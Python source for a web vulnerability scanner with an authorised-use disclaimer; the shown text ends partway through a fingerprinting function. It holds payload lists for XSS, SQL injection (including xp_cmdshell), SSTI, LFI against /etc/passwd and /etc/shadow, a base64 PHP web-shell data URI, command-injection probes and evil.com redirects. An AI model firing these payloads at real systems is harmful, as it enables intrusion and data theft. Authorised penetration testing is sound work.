#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#https://t.me/P33_9
#https://www.instagram.com/_ungn
#py:ALI HAIDAR DABAAN (FIXED PY CLU)
"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                                                                                  ║
║    🔥🐉  T H E   B L A Z I N G   B L A C K   D R A G O N                       ║
║                    W I T H   F I E R Y   B R E A T H  🐉🔥                      ║
║                                                                                  ║
║         Professional Web Vulnerability Assessment Engine — v4.0.0               ║
║                    For authorised penetration testing only                       ║
║                                                                                  ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  MODULES (26 fire-breathing attack vectors):                                     ║
║  ✦ Auto-Dependency Installer      ✦ Port Scanner (nmap/TCP)                      ║
║  ✦ WAF/CDN Fingerprinting         ✦ Web Server Fingerprinting                    ║
║  ✦ Security Headers Analysis      ✦ SSL/TLS Deep Inspection                      ║
║  ✦ CMS Detection (13 platforms)   ✦ robots.txt / sitemap analysis                ║
║  ✦ Directory & File Enumeration   ✦ JavaScript Secret Scanner                    ║
║  ✦ CORS Misconfiguration          ✦ HTTP Method Tampering                         ║
║  ✦ Host Header Injection          ✦ XSS / Reflected Input Detection              ║
║  ✦ SQL Injection (error+blind)    ✦ Server-Side Template Injection               ║
║  ✦ Open Redirect Detection        ✦ Path Traversal / LFI / RFI                   ║
║  ✦ Command Injection Probes       ✦ CSRF Token Analysis                          ║
║  ✦ Form & Login Surface Mapper    ✦ Email & Link Harvester                       ║
║  ✦ GraphQL Introspection Test     ✦ DNS Zone Transfer & SPF/DMARC                ║
║  ✦ OAuth/JWT Misconfiguration     ✦ HTTP Request Smuggling (CL.TE)               ║
║  ✦ Subdomain Enumeration          ✦ Custom User-Defined Scan Queries             ║
║  ✦ Nikto / Nuclei / SQLmap hooks  ✦ Export: HTML/JSON/TXT/CSV/XML               ║
╠══════════════════════════════════════════════════════════════════════════════════╣
║  DISCLAIMER: Only scan systems you own or have EXPLICIT WRITTEN permission       ║
║              to test. Unauthorised scanning is illegal worldwide.                ║
╚══════════════════════════════════════════════════════════════════════════════════╝
"""

# ── stdlib ─────────────────────────────────────────────────────────────────────
import os, re, sys, ssl, json, time, socket, shutil, hashlib, base64
import logging, datetime, ipaddress, subprocess, threading, csv
import concurrent.futures
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any, Set
from urllib.parse import urlparse, urljoin, quote, urlencode, parse_qs, urlunparse
from http.client import RemoteDisconnected
import html as html_module
import xml.etree.ElementTree as ET

# ══════════════════════════════════════════════════════════════════════════════
# AUTO-INSTALLER — silently installs every required package
# ══════════════════════════════════════════════════════════════════════════════

REQUIRED_PACKAGES = {
    "requests":        "requests",
    "bs4":             "beautifulsoup4",
    "lxml":            "lxml",
    "urllib3":         "urllib3",
    "dnspython":       "dnspython",
    "cryptography":    "cryptography",
    "colorama":        "colorama",
    "tabulate":        "tabulate",
}

def _auto_install():
    """Install any missing packages without user interaction."""
    missing = []
    for module, pkg in REQUIRED_PACKAGES.items():
        try:
            __import__(module)
        except ImportError:
            missing.append(pkg)

    if missing:
        print(f"\033[93m[~] Auto-installing {len(missing)} missing package(s): "
              f"{', '.join(missing)}\033[0m")
        for pkg in missing:
            try:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", pkg, "-q",
                     "--disable-pip-version-check"],
                    check=True, capture_output=True
                )
                print(f"\033[92m[+] Installed: {pkg}\033[0m")
            except subprocess.CalledProcessError as e:
                print(f"\033[91m[!] Failed to install {pkg}: {e}\033[0m")

_auto_install()

# ── Now import everything ──────────────────────────────────────────────────────
try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

try:
    from bs4 import BeautifulSoup
    BS4_OK = True
except ImportError:
    BS4_OK = False

try:
    import dns.resolver, dns.zone, dns.query, dns.exception
    DNS_OK = True
except ImportError:
    DNS_OK = False

try:
    import nmap as python_nmap
    NMAP_LIB_OK = True
except ImportError:
    NMAP_LIB_OK = False

try:
    from tabulate import tabulate
    TABULATE_OK = True
except ImportError:
    TABULATE_OK = False

try:
    import colorama
    colorama.init(autoreset=True)
    COLORAMA_OK = True
except ImportError:
    COLORAMA_OK = False

# ── logging ───────────────────────────────────────────────────────────────────
logging.basicConfig(level=logging.WARNING,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ══════════════════════════════════════════════════════════════════════════════
VERSION       = "4.0.0"
TOOL_NAME     = "The Blazing Black Dragon with Fiery Breath"
TIMEOUT       = 12
FAST_TIMEOUT  = 5
DELAY         = 0.25
STEALTH_DELAY = 2.0
THREADS       = 20
SEV_ORDER     = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}

# ── ANSI colours ──────────────────────────────────────────────────────────────
class C:
    R   = "\033[0m"
    B   = "\033[1m"
    RED = "\033[91m"; GRN = "\033[92m"; YLW = "\033[93m"
    BLU = "\033[94m"; MAG = "\033[95m"; CYN = "\033[96m"
    WHT = "\033[97m"; GRY = "\033[90m"; ORG = "\033[38;5;208m"
    FIRE= "\033[38;5;196m"
    @staticmethod
    def sev(s):
        return {
            "Critical": "\033[91m\033[1m", "High": "\033[91m",
            "Medium":   "\033[93m",         "Low":  "\033[96m",
            "Info":     "\033[90m"
        }.get(s, "\033[97m")

if sys.platform == "win32":
    os.system("")

# ── Browser headers ───────────────────────────────────────────────────────────
BROWSER_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/124.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

# ── Common ports ──────────────────────────────────────────────────────────────
COMMON_PORTS = {
    21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
    110:"POP3",143:"IMAP",443:"HTTPS",445:"SMB",993:"IMAPS",
    995:"POP3S",1433:"MSSQL",1521:"Oracle",3000:"Dev-HTTP",
    3306:"MySQL",3389:"RDP",4443:"HTTPS-Alt",5432:"PostgreSQL",
    5900:"VNC",6379:"Redis",7001:"WebLogic",8000:"HTTP-Alt",
    8080:"HTTP-Alt",8443:"HTTPS-Alt",8888:"HTTP-Alt",9000:"PHP-FPM",
    9200:"Elasticsearch",27017:"MongoDB",
}

# ── Wordlists ─────────────────────────────────────────────────────────────────
DIR_WORDLIST = [
    # Admin / auth
    "admin","administrator","wp-admin","wp-login.php","login","logout",
    "dashboard","panel","cpanel","webmail","phpmyadmin","pma","adminer",
    "admin/login","admin/dashboard","user/login","auth/login",
    "controlpanel","manage","management","superadmin","superuser",
    # Config / sensitive
    ".env",".env.local",".env.production",".env.backup",".env.dev",
    ".git",".git/HEAD",".git/config",".git/COMMIT_EDITMSG",
    ".svn",".svn/entries",".htaccess",".htpasswd",".DS_Store",
    "config.php","config.yml","config.yaml","config.json","config.ini",
    "configuration.php","wp-config.php","settings.py","settings.php",
    "database.yml","db.php","db.sql","dump.sql","backup.sql",
    "web.config","applicationHost.config","appsettings.json",
    "secrets.json","credentials.json","credentials.xml",
    # Backups
    "backup","backups","bak","old","archive","temp","tmp",
    "backup.zip","backup.tar.gz","www.zip","site.zip","files.zip",
    "db_backup.sql","database_backup.sql","data.sql",
    # Info disclosure
    "phpinfo.php","info.php","test.php","debug.php","status",
    "server-status","server-info","nginx_status","health","ping","ready",
    "robots.txt","sitemap.xml","sitemap_index.xml","crossdomain.xml",
    ".well-known/security.txt",".well-known/assetlinks.json",
    "readme.txt","README.md","CHANGELOG","LICENSE","INSTALL","VERSION",
    "composer.json","package.json","yarn.lock","Gemfile","Pipfile",
    "Dockerfile","docker-compose.yml","docker-compose.yaml",
    ".dockerignore",".github","Makefile","Vagrantfile",
    # CMS paths
    "xmlrpc.php","wp-cron.php","wp-json","wp-json/wp/v2/users",
    "wp-content/debug.log","wp-content/uploads","wp-includes/",
    "administrator","components","modules","templates","joomla.xml",
    "sites/default","sites/default/settings.php","CHANGELOG.txt",
    # API endpoints
    "api","api/v1","api/v2","api/v3","graphql","swagger",
    "swagger-ui.html","api-docs","openapi.json","openapi.yaml","redoc",
    "v1","v2","v3","rest","soap","wsdl",
    "api/users","api/admin","api/config","api/debug",
    # Shells
    "shell.php","cmd.php","webshell.php","c99.php","r57.php",
    "b374k.php","WSO.php","upload.php","uploader.php","filemanager.php",
    # Logs
    "error_log","access_log","error.log","access.log","debug.log",
    "app.log","application.log","laravel.log","php_errors.log",
    "django.log","rails.log","spring.log",
    # Misc
    "cgi-bin","cgi-bin/test.cgi","cgi-bin/printenv",
    "include","includes","inc","lib","library","vendor","node_modules",
    "static","assets","uploads","files","images","media",
    "_profiler","_wdt","telescope","horizon","adminer.php",
    ".travis.yml",".circleci","sonar-project.properties",
    "actuator","actuator/env","actuator/health","actuator/mappings",
    "metrics","trace","logfile","heapdump","dump",
]

SUBDOMAINS = [
    "www","mail","webmail","smtp","pop","imap","ftp","sftp",
    "dev","development","staging","test","qa","uat","demo",
    "admin","administrator","portal","dashboard","control","panel",
    "api","api2","rest","graphql","service","services",
    "cdn","static","assets","media","images","files","downloads",
    "blog","shop","store","pay","payment","checkout","cart",
    "support","help","ticket","status","monitor","vpn",
    "remote","gateway","proxy","firewall","ns1","ns2","mx","mx1","mx2",
    "db","database","mysql","postgres","redis","mongo","elastic",
    "git","svn","jenkins","ci","build","deploy","gitlab","bitbucket",
    "app","mobile","beta","alpha","preview","sandbox",
    "internal","intranet","corp","office","staff","employee",
    "secure","login","auth","oauth","sso","id","identity",
    "legacy","old","backup","archive","backup2",
]

# ── Payload libraries ─────────────────────────────────────────────────────────
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><img src=x onerror=alert(1)>',
    "';alert(1)//",
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '"><svg/onload=alert(1)>',
    "javascript:alert(1)",
    '<details open ontoggle=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
]

SQLI_PAYLOADS = [
    "'", '"', "'`", "\\", "1'",
    "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
    '" OR "1"="1', '" OR 1=1--',
    "') OR ('1'='1", "1) OR (1=1",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "1; SELECT SLEEP(0)--",
    "' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--",
    "'; EXEC xp_cmdshell('id')--",
]

SQLI_TIME_PAYLOADS = [
    ("' AND SLEEP(3)--",           3.0, "MySQL SLEEP"),
    ("'; WAITFOR DELAY '0:0:3'--", 3.0, "MSSQL WAITFOR"),
    ("' AND pg_sleep(3)--",        3.0, "PostgreSQL pg_sleep"),
    ("' OR SLEEP(3)#",             3.0, "MySQL SLEEP (#)"),
    ("1 AND 3*2*1=6 AND 000338=000338", 0, "Boolean-based blind"),
    ("' AND BENCHMARK(5000000,MD5('x'))--", 3.0, "MySQL BENCHMARK"),
]

SQL_ERRORS = [
    "you have an error in your sql syntax","warning: mysql",
    "unclosed quotation mark","quoted string not properly terminated",
    "pg_query()","pg_exec()","supplied argument is not a valid",
    "ora-01756","ora-00933","ora-00907","microsoft ole db",
    "odbc microsoft access driver","microsoft jet database",
    "[microsoft][odbc sql server driver]",
    "sqlite_master","sqlite3.operationalerror",
    "sqlstate","sql syntax","syntax error","db error",
    "mysql_fetch","mysql_num_rows","mysql_result",
    "division by zero","invalid query","syntax error or access violation",
]

SSTI_PAYLOADS = [
    ("{{7*7}}",    "49",  "Jinja2/Twig"),
    ("${7*7}",     "49",  "Freemarker/EL"),
    ("#{7*7}",     "49",  "Thymeleaf"),
    ("<%= 7*7 %>", "49",  "ERB/JSP"),
    ("*{7*7}",     "49",  "Spring SpEL"),
    ("{{7*'7'}}",  "7777777", "Jinja2"),
    ("{${7*7}}",   "49",  "Pebble"),
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/hosts",
    "/proc/self/environ",
    "/proc/version",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "file:///etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
]

LFI_SIGNATURES = [
    "root:x:0:0", "root:0:0", "[boot loader]", "[fonts]",
    "bin/bash", "bin/sh", "daemon:x:", "nobody:x:",
    "Windows NT", "WINDOWS", "System32",
]

CMD_INJECTION_PAYLOADS = [
    (";id", ["uid=", "gid=", "groups="]),
    ("|id", ["uid=", "gid="]),
    ("&&id", ["uid=", "gid="]),
    (";whoami", ["root","www-data","apache","nginx","nobody"]),
    ("|whoami", ["root","www-data","apache"]),
    ("$(id)", ["uid=", "gid="]),
    ("`id`",  ["uid=", "gid="]),
    (";sleep 3", []),      # time-based
    ("|sleep 3", []),
    ("& ping -c 3 127.0.0.1 &", []),
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "//evil.com%2F%2F",
    "/\\evil.com",
    "https://evil.com/",
    "http://evil.com",
    "https:evil.com",
    "%68%74%74%70%73%3A%2F%2Fevil.com",
    "/%09/evil.com",
    "https://evil%E3%80%82com",
]

REDIRECT_PARAMS = [
    "next","redirect","redirect_to","redirect_url","url","return",
    "return_url","returnurl","return_to","goto","location","dest",
    "destination","redir","r","u","link","path","target","forward",
    "callback","continue","jump","ref","referer","referrer","view",
    "from","to","out","go","navigate","page","q",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "sev":"Medium","fix":"Strict-Transport-Security: max-age=31536000; includeSubDomains; preload",
        "desc":"HSTS forces HTTPS connections and prevents SSL stripping.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"
    },
    "Content-Security-Policy": {
        "sev":"High","fix":"Content-Security-Policy: default-src 'self'",
        "desc":"CSP prevents XSS and data injection attacks by restricting resource origins.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"
    },
    "X-Frame-Options": {
        "sev":"Medium","fix":"X-Frame-Options: DENY",
        "desc":"Prevents clickjacking attacks by blocking iframe embedding.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"
    },
    "X-Content-Type-Options": {
        "sev":"Low","fix":"X-Content-Type-Options: nosniff",
        "desc":"Prevents MIME-type sniffing which can lead to XSS.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options"
    },
    "Referrer-Policy": {
        "sev":"Low","fix":"Referrer-Policy: strict-origin-when-cross-origin",
        "desc":"Controls referrer information sent with requests.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"
    },
    "Permissions-Policy": {
        "sev":"Low","fix":"Permissions-Policy: camera=(), microphone=(), geolocation=()",
        "desc":"Restricts browser features and APIs available to the page.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Permissions-Policy"
    },
    "Cross-Origin-Opener-Policy": {
        "sev":"Low","fix":"Cross-Origin-Opener-Policy: same-origin",
        "desc":"Protects against cross-origin window interactions.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy"
    },
    "Cross-Origin-Resource-Policy": {
        "sev":"Low","fix":"Cross-Origin-Resource-Policy: same-origin",
        "desc":"Restricts which sites can embed this site's resources.",
        "ref":"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Resource-Policy"
    },
}

CMS_SIGS = {
    "WordPress":  {"body":["wp-content","wp-includes","WordPress"],"paths":["/wp-login.php","/wp-admin/"]},
    "Joomla":     {"body":["Joomla!","/components/com_"],"paths":["/administrator/"]},
    "Drupal":     {"body":["Drupal.settings","drupal.org","sites/default"],"paths":["/sites/default/"]},
    "Magento":    {"body":["Mage.Cookies","varien/js.js","mage/"],"paths":["/skin/frontend/"]},
    "Shopify":    {"body":["cdn.shopify.com","Shopify.theme"],"paths":[]},
    "PrestaShop": {"body":["prestashop","addons.prestashop.com"],"paths":["/modules/"]},
    "OpenCart":   {"body":["catalog/view/theme","route=common/home"],"paths":["/admin/"]},
    "TYPO3":      {"body":["typo3/","TYPO3"],"paths":["/typo3/"]},
    "Django":     {"body":["csrfmiddlewaretoken","__admin_media_prefix__"],"paths":["/admin/"]},
    "Laravel":    {"body":["laravel_session","XSRF-TOKEN","laravel"],"paths":[]},
    "Rails":      {"body":["authenticity_token","rails","action_dispatch"],"paths":[]},
    "ASP.NET":    {"body":["__VIEWSTATE","__EVENTVALIDATION","asp.net"],"paths":[]},
    "Spring":     {"body":["spring","org.springframework","Whitelabel Error"],"paths":[]},
    "Next.js":    {"body":["__NEXT_DATA__","_next/static"],"paths":[]},
    "Nuxt.js":    {"body":["__NUXT__","_nuxt/"],"paths":[]},
}

WAF_SIGS = {
    "Cloudflare":  ["cf-ray","cloudflare","__cfduid","cf-cache-status"],
    "AWS WAF":     ["x-amzn-requestid","x-amz-cf-id","awselb"],
    "Akamai":      ["akamai","x-akamai-transformed","x-check-cacheable"],
    "Sucuri":      ["x-sucuri-id","x-sucuri-cache","sucuri"],
    "Imperva":     ["x-iinfo","incap_ses","visid_incap"],
    "F5 BIG-IP":   ["bigipserver","f5-trafficshield","ts="],
    "ModSecurity": ["mod_security","modsecurity","NOYB"],
    "Wordfence":   ["wordfence","wfvt_"],
    "Barracuda":   ["barra_counter_session"],
    "Reblaze":     ["x-reblaze-protection"],
    "Fastly":      ["x-fastly-request-id","fastly"],
    "Varnish":     ["x-varnish","x-cache: hit"],
}

JS_SECRET_PATTERNS = [
    (r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']([A-Za-z0-9\-_]{16,})["\']',       "API Key"),
    (r'(?i)(secret[_-]?key|secret)\s*[:=]\s*["\']([A-Za-z0-9\-_/+=]{16,})["\']', "Secret Key"),
    (r'(?i)(access[_-]?token|auth[_-]?token)\s*[:=]\s*["\']([A-Za-z0-9\-_.]{16,})["\']', "Access Token"),
    (r'(?i)(password|passwd|pwd)\s*[:=]\s*["\']([^"\']{6,})["\']',                "Hardcoded Password"),
    (r'(?i)(aws_access_key_id|aws_secret)\s*[:=]\s*["\']([A-Z0-9]{16,})["\']',    "AWS Key"),
    (r'AKIA[0-9A-Z]{16}',                                                           "AWS Access Key ID"),
    (r'(?i)(private[_-]?key)\s*[:=]\s*["\']([A-Za-z0-9\-_]{16,})["\']',          "Private Key"),
    (r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+',                 "JWT Token"),
    (r'(?i)(bearer\s+)([A-Za-z0-9\-_.~+/]{20,})',                                 "Bearer Token"),
    (r'(?i)(github[_-]?token|gh_token)\s*[:=]\s*["\']([A-Za-z0-9_]{35,45})["\']',"GitHub Token"),
    (r'(?i)(stripe[_-]?key|stripe_secret)\s*[:=]\s*["\']([A-Za-z0-9_]{20,})["\']',"Stripe Key"),
    (r'(?i)google[_-]?api[_-]?key\s*[:=]\s*["\']([A-Za-z0-9\-_]{35,45})["\']',  "Google API Key"),
    (r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----',                             "PEM Private Key"),
    (r'(?i)(slack[_-]?token|xoxb-[0-9]+)',                                         "Slack Token"),
    (r'(?i)(firebase[_-]?url)\s*[:=]\s*["\']([^"\']{10,})["\']',                  "Firebase URL"),
    (r'(?i)(mailchimp|mailgun|sendgrid)[_-]?key\s*[:=]\s*["\']([A-Za-z0-9\-_]{20,})["\']', "Email Service Key"),
]

# ══════════════════════════════════════════════════════════════════════════════
# DATA MODELS
# ══════════════════════════════════════════════════════════════════════════════

class Vuln:
    __slots__ = ("name","severity","desc","component","evidence",
                 "fix","refs","cves","ts","module")
    def __init__(self, name, severity, desc, component="", evidence="",
                 fix="", refs=None, cves=None, module=""):
        self.name      = name
        self.severity  = severity
        self.desc      = desc
        self.component = component
        self.evidence  = evidence[:600] if evidence else ""
        self.fix       = fix
        self.refs      = refs or []
        self.cves      = cves or []
        self.ts        = datetime.datetime.utcnow().isoformat() + "Z"
        self.module    = module

    def to_dict(self):
        return {k: getattr(self, k) for k in self.__slots__}


class Report:
    def __init__(self, url, ip=""):
        self.url        = url
        self.ip         = ip
        self.start      = datetime.datetime.utcnow()
        self.end        = None
        self.vulns: List[Vuln] = []
        self.ports: List[Dict] = []
        self.info: Dict        = {}
        self.waf            = None
        self.subdomains     = []
        self.emails         = set()
        self.forms          = []
        self.links_found    = []
        self._errors: List  = []
        self._seen: Set[str]= set()

    def add(self, v: Vuln):
        key = f"{v.name}|{v.component}"
        if key not in self._seen:
            self._seen.add(key)
            self.vulns.append(v)

    def err(self, msg: str):
        self._errors.append(msg)
        log.debug(f"Module error: {msg}")

    def done(self):
        self.end = datetime.datetime.utcnow()
        self.vulns.sort(key=lambda v: SEV_ORDER.get(v.severity, 99))

    def stats(self) -> Dict:
        stats = {s: 0 for s in SEV_ORDER}
        for v in self.vulns:
            stats[v.severity] = stats.get(v.severity, 0) + 1
        return stats

    def duration(self) -> str:
        if self.end:
            d = (self.end - self.start).total_seconds()
            return f"{d:.1f}s"
        return "running…"


# ══════════════════════════════════════════════════════════════════════════════
# HTTP SESSION
# ══════════════════════════════════════════════════════════════════════════════

class Session:
    def __init__(self, delay=DELAY, timeout=TIMEOUT):
        self.delay   = delay
        self.timeout = timeout
        self._lock   = threading.Lock()
        self._sess   = self._build()

    def _build(self):
        s = requests.Session()
        retry = Retry(total=2, backoff_factor=0.5,
                      status_forcelist=[429,500,502,503,504],
                      allowed_methods=["GET","POST","HEAD","OPTIONS"])
        adapter = HTTPAdapter(max_retries=retry)
        s.mount("https://", adapter)
        s.mount("http://",  adapter)
        s.headers.update(BROWSER_HEADERS)
        s.verify = False
        return s

    def get(self, url, **kw) -> Optional[requests.Response]:
        kw.setdefault("timeout", self.timeout)
        kw.setdefault("allow_redirects", True)
        try:
            time.sleep(self.delay)
            return self._sess.get(url, **kw)
        except Exception:
            return None

    def post(self, url, **kw) -> Optional[requests.Response]:
        kw.setdefault("timeout", self.timeout)
        try:
            time.sleep(self.delay)
            return self._sess.post(url, **kw)
        except Exception:
            return None

    def options(self, url, **kw) -> Optional[requests.Response]:
        kw.setdefault("timeout", FAST_TIMEOUT)
        try:
            return self._sess.options(url, **kw)
        except Exception:
            return None


# ══════════════════════════════════════════════════════════════════════════════
# RESOLVER
# ══════════════════════════════════════════════════════════════════════════════

class Resolver:
    @staticmethod
    def normalise(url: str) -> str:
        url = url.strip()
        if not url.startswith(("http://","https://")):
            url = "https://" + url
        p = urlparse(url)
        if not p.netloc:
            raise ValueError(f"Invalid URL: {url}")
        return url

    @staticmethod
    def resolve_ip(url: str) -> str:
        host = urlparse(url).hostname or url
        return socket.gethostbyname(host)

    @staticmethod
    def check_reachable(url: str) -> Tuple[bool, str]:
        sess = requests.Session()
        sess.verify = False
        for method in ["get", "head"]:
            try:
                r = getattr(sess, method)(url, timeout=8, allow_redirects=True,
                                          headers=BROWSER_HEADERS, stream=True)
                r.close()
                return True, f"HTTP {r.status_code} ({r.url})"
            except requests.exceptions.SSLError as e:
                return False, f"SSL error: {e}"
            except requests.exceptions.ConnectionError:
                continue
            except Exception as e:
                return False, str(e)
        # fallback raw TCP
        host = urlparse(url).hostname
        port = urlparse(url).port or 443
        try:
            with socket.create_connection((host, port), timeout=5):
                return True, f"TCP {port} reachable (HTTP probe blocked)"
        except Exception:
            pass
        return False, "All connection attempts failed"


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: PORT SCANNER
# ══════════════════════════════════════════════════════════════════════════════

class PortScanner:
    def __init__(self, host, report: Report, fast=False):
        self.host   = host
        self.report = report
        self.fast   = fast

    def _tcp_scan(self, ports) -> List[Dict]:
        results = []
        def probe(p):
            try:
                with socket.create_connection((self.host, p),
                                              timeout=0.7 if self.fast else 1.5):
                    return {"port":p,"proto":"tcp",
                            "service":COMMON_PORTS.get(p,"unknown"),
                            "version":"","state":"open"}
            except Exception:
                return None
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
            for r in ex.map(probe, ports):
                if r: results.append(r)
        return sorted(results, key=lambda x: x["port"])

    def scan(self) -> List[Dict]:
        _status("Port scanning")
        ports = list(COMMON_PORTS.keys())
        nmap_bin = shutil.which("nmap")
        if NMAP_LIB_OK and nmap_bin:
            try:
                nm   = python_nmap.PortScanner()
                args = ("-sV --top-ports 1000 -T4 --open" if not self.fast
                        else "-sV --top-ports 200 -T5 --open")
                nm.scan(self.host, arguments=args)
                results = []
                if self.host in nm.all_hosts():
                    for proto in nm[self.host].all_protocols():
                        for port, d in nm[self.host][proto].items():
                            if d["state"] == "open":
                                results.append({
                                    "port":port,"proto":proto,
                                    "service":d.get("name","unknown"),
                                    "version":d.get("version",""),
                                    "state":"open"
                                })
                self.report.ports = results
                _flag_dangerous_ports(results, self.report)
                return results
            except Exception as e:
                self.report.err(f"nmap: {e}")
        results = self._tcp_scan(ports)
        self.report.ports = results
        _flag_dangerous_ports(results, self.report)
        return results


def _flag_dangerous_ports(ports, report: Report):
    dangerous = {
        21:"FTP (cleartext)",23:"Telnet (cleartext)",3389:"RDP exposed",
        445:"SMB exposed",5900:"VNC exposed",6379:"Redis (no-auth default)",
        27017:"MongoDB (no-auth default)",9200:"Elasticsearch (no-auth)",
        2375:"Docker API (unauthenticated)",4243:"Docker API (unauthenticated)",
        6443:"Kubernetes API",8500:"Consul API",
    }
    for p in ports:
        if p["port"] in dangerous:
            report.add(Vuln(
                name=f"Dangerous service exposed: {dangerous[p['port']]} (:{p['port']})",
                severity="High",
                desc=f"Port {p['port']} ({dangerous[p['port']]}) is publicly accessible. "
                     "Commonly exploited for unauthenticated access or brute-force.",
                component=f"{report.ip}:{p['port']}",
                fix="Restrict with firewall. Use VPN for admin access. Disable if unused.",
                refs=["https://owasp.org/www-community/attacks/"],
                module="PortScanner"
            ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: WAF / CDN FINGERPRINTING
# ══════════════════════════════════════════════════════════════════════════════

class WAFDetector:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def detect(self):
        _status("WAF/CDN fingerprinting")
        r = self.sess.get(self.url)
        if not r: return
        h_lower  = {k.lower(): v.lower() for k, v in r.headers.items()}
        haystack = " ".join(h_lower.keys()) + " " + " ".join(h_lower.values())
        haystack += " " + " ".join(c.name.lower() for c in r.cookies)
        for waf_name, sigs in WAF_SIGS.items():
            if any(s in haystack for s in sigs):
                self.report.waf = waf_name
                self.report.info["waf"] = waf_name
                self.report.add(Vuln(
                    name=f"WAF/CDN detected: {waf_name}", severity="Info",
                    desc=f"{waf_name} detected. WAFs mitigate some attacks but are not a "
                         "replacement for secure code.",
                    component=self.url,
                    fix="WAFs are defence-in-depth, not a silver bullet.",
                    module="WAFDetector"
                ))
                return
        # Challenge with malicious payload
        test_url = self.url + "/?id=1'+OR+'1'='1&q=<script>alert(1)</script>"
        r2 = self.sess.get(test_url, allow_redirects=False)
        if r2 and r2.status_code in (403,406,429,503):
            self.report.info["waf"] = "Unknown WAF (blocked malicious probe)"
            self.report.add(Vuln(
                name="WAF/IDS detected (blocked malicious probe)", severity="Info",
                desc=f"Security device blocked test payload (HTTP {r2.status_code}).",
                component=self.url,module="WAFDetector"
            ))


# ══════════════════════════════════════════════════════════════════════════════
# MODULE: WEB FINGERPRINTING
# ══════════════════════════════════════════════════════════════════════════════

class Fingerprinter:
    def __init__(self, url, sess: Session, report: Report):
        self.url = url; self.sess = sess; self.report = report

    def run(self):
        _status("Web server fingerprinting")
        r = self.sess.get(self.url)
        if not r: return
        h  = {k.lower(): v for k, v in r.headers.items()}
        info = {}
        if "server" in h:
            info["server"] = h["server"]
            if re.search(r"[/\s]\d+\.\d+", h["server"]):
                self.report.add(Vuln(
                    name="Server version disclosure (Server header)", severity="Low",
                    desc=f"Server header reveals: '{h['server']}'.",
                    component=self.url, evidence=f"Server: {h['server']}",
                    fix="Set generic server token without version.",
                    module="Fingerprinter"
                ))
        if "x-powered-by" in h:
            info["powered_by"] = h["x-powered-by"]
            self.report.add(Vuln(
                name="Technology disclosure (X-Powered-By)", severity="Info",
                desc=f"X-Powered-By: {h['x-powered-by']}",
                component=self.url, evidence=f"X-Powered-By: {h['x-powered-by']}",
                fix="Remove X-Powered-By header.",module="Fingerprinter"
            ))
        if "x-aspnet-version" in h:
            self.report.add(Vuln(
                name="ASP.NET version disclosure", severity="Low",
                desc=f"X-Aspnet-Version: {h['x-aspnet-version']}",
                component=self.url,
                fix="Set <httpRuntime enableVersionHeader='false'/> in Web.config.",
                module="Fingerprinter"
            ))
        # Cookie tech hints
        ck_raw = h.get("set-cookie","").lower()
        for token, lang in [("phpsessid","PHP"),("jsessionid","Java"),
                             ("asp.net_sessionid","ASP.NET"),("rack.session","Ruby"),
                             ("laravel_session","PHP/Laravel"),("django_session","Python/Django")]:
